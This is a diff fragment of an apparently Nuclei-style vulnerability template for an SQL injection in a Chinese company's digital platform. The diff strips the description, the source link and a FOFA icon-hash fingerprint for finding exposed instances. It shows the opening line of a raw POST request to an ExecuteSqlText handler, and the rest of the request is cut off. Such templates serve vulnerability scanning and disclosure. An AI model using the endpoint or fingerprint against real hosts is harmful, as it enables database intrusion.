@@ -3,12 +3,8 @@ info:
   name: 山东启恒信息科技有限公司数智化平台 CommonHandler 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pnzlw5nkekapp90b'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pnzlw5nkekapp90b
-    fofa: icon_hash=1409809372
 http:
 - raw:
   - 'POST /Handers/CommonHandler.ashx?action=ExecuteSqlText HTTP/1.1
